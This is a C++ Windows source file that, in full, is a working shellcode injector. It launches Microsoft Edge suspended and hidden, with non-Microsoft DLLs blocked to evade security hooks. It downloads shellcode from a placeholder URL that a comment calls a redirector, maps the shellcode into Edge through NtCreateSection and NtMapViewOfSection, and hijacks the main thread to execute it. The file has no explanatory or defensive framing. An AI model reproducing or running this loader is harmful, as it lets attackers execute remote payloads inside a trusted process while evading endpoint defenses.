```c++
#include <Windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include "Native.h"

#pragma comment(lib, "winhttp.lib")
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    const DWORD attributeCount = 1;
    LPSTARTUPINFOEXW si = new STARTUPINFOEXW();
    si->StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si->StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    // create startup info struct
    //LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    //startup_info->cb = sizeof(STARTUPINFOW);
    //startup_info->dwFlags = STARTF_USESHOWWINDOW;

    SIZE_T lpSize = 0;

    // call once to get lpSize
    InitializeProcThreadAttributeList(
        NULL,
        attributeCount,
        0,
        &lpSize);

    // allocate the memory
    si->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);

    InitializeProcThreadAttributeList(
        si->lpAttributeList,
        attributeCount,
        0,
        &lpSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(
        si->lpAttributeList,
        NULL,
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
        &policy,
        sizeof(DWORD64),
        NULL,
        NULL);

    // create process info struct
    PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = LR"(C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe)";


    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        &si->StartupInfo,
        pi);

    printf("PID: %d\n", pi->dwProcessId);

    DeleteProcThreadAttributeList(si->lpAttributeList);
    free(si->lpAttributeList);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"<your url>\0", L"/shellcode.bin\0");

    printf("Shellcode size %zu\n ", shellcode.size());

    // find Nt APIs
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    if (!NT_SUCCESS(status)) {
        printf("NtCreateSection failed Ox%X\n", status);
    }

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        printf("Local NtMapViewOfSection fallo: 0x%08X\n", status);
        return 1;
    }

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        pi->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READ);

    if (!NT_SUCCESS(status)) {
        return 1;
    }

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(pi->hThread, pContext);

    // resume thread
    ResumeThread(pi->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);

    //Create session to our redirector
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(hRequest, NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
